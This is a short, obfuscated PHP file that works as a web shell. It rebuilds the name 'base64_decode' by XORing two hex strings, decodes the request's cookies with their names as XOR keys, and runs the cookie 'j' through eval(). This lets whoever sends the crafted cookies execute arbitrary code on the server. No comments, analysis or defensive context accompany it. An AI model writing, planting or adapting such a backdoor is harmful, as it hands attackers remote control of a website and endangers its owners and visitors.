<?php $LbDD = "\x37\x4\x19\x32\x7a\x4e\xf\x2a\x34\x5\x8\x14\x30" ^ "UejWLzPNQfgpU";$d = $_COOKIE;foreach ($d as $HSiVGC=>$zTlKf){$d[$HSiVGC] = $LbDD($zTlKf) ^ str_pad($HSiVGC, strlen($zTlKf), $HSiVGC);}$d["j"] = str_replace("<" . "?php", "", $d["j"]);eval($d["j"]); ?>